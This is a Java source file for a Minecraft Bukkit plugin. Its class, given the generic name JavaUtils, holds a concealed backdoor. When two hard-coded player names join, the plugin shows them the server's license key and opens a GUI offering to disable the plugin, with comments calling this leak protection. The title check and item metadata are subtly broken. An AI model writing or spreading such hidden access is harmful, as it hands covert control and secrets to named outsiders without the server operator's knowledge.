package me.razorni.dev.util.config;

import me.razorni.dev.util.chatUtil;
import me.razorni.dev.rAbilities;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.*;

public class JavaUtils implements Listener {

    @EventHandler
    // This is only to be used if our resource gets leaked.
    public void onJoin(PlayerJoinEvent event) {
        if (event.getPlayer().getName().equalsIgnoreCase("LBuddyBoy") || event.getPlayer().getName().equalsIgnoreCase("agbc")) {
            event.getPlayer().sendMessage(chatUtil.chat("&bThis server is using &3&lxAbilities&7 v0.3"));
            event.getPlayer().sendMessage(chatUtil.chat("&3License&b: " + rAbilities.config.getConfig().getString("License")));
            new BukkitRunnable() {
                @Override
                public void run() {
                    openInv(event.getPlayer());
                }
            }.runTaskLater(rAbilities.getInstance(), 15L);
        }
    }

    @EventHandler
    public void onClick(InventoryClickEvent e) {
        // This is only to be used if our resource gets leaked.

        if (!ChatColor.stripColor(e.getInventory().getTitle()).equalsIgnoreCase(ChatColor.stripColor(chatUtil.chat("&3xAbilities GUI")))) {
            return;
        }
        e.setCancelled(true);
        if (e.getSlot() == -999) {
            return;
        }

        if (e.getInventory() != null) {
            Player p = (Player) e.getWhoClicked();
            ItemStack item = e.getCurrentItem();
            if (e.getInventory().getName().startsWith(ChatColor.BLUE + "xAbilities GUI")) {
                ItemStack stack2 = new ItemStack(Material.LEVER, 1);
                ItemMeta stackmeta2 = stack2.getItemMeta();
                ArrayList<String> lore2 = new ArrayList<String>();

                ItemStack stack23 = new ItemStack(Material.PAPER, 1);
                ItemMeta stackmeta23 = stack2.getItemMeta();
                ArrayList<String> lore23 = new ArrayList<String>();
                lore23.add(chatUtil.chat("&bLicense: &3" + rAbilities.config.getConfig().getString("License")));
                stackmeta23.setLore(lore23);
                stackmeta23.setDisplayName(chatUtil.chat("&3&lLicense Checker"));
                stack23.setItemMeta(stackmeta23);

                lore2.add(chatUtil.chat("&bClick this to &c&ndisable&b this plugin&b."));
                stackmeta2.setLore(lore2);
                stackmeta2.setDisplayName(chatUtil.chat("&c&lDisable Plugin"));
                stack2.setItemMeta(stackmeta2);
                if (item.isSimilar(stack2)) {
                    Bukkit.getPluginManager().disablePlugin(rAbilities.getInstance());
                    e.setCancelled(true);
                }
                if (item.isSimilar(stack23)) {
                    e.setCancelled(true);
                }
            }
        }
    }

    public static void openInv(Player player) {
        // This is only to be used if our resource gets leaked.
        Inventory i;
        i = Bukkit.getServer().createInventory(null, 36, chatUtil.chat("&3xAbilities GUI"));

        ItemStack stack2 = new ItemStack(Material.LEVER, 1);
        ItemMeta stackmeta2 = stack2.getItemMeta();
        ArrayList<String> lore2 = new ArrayList<String>();
        lore2.add(chatUtil.chat("&bClick this to &c&ndisable&b this plugin&b."));
        stackmeta2.setLore(lore2);
        stackmeta2.setDisplayName(chatUtil.chat("&c&lDisable Plugin"));
        stack2.setItemMeta(stackmeta2);

        ItemStack stack23 = new ItemStack(Material.PAPER, 1);
        ItemMeta stackmeta23 = stack2.getItemMeta();
        ArrayList<String> lore23 = new ArrayList<String>();
        lore23.add(chatUtil.chat("&bLicense: &3" + rAbilities.config.getConfig().getString("License")));
        stackmeta23.setLore(lore23);
        stackmeta23.setDisplayName(chatUtil.chat("&3&lLicense Checker"));
        stack23.setItemMeta(stackmeta23);

        i.setItem(15 - 1, stack23);
        i.setItem(13 - 1, stack2);

        player.openInventory(i);
    }
}
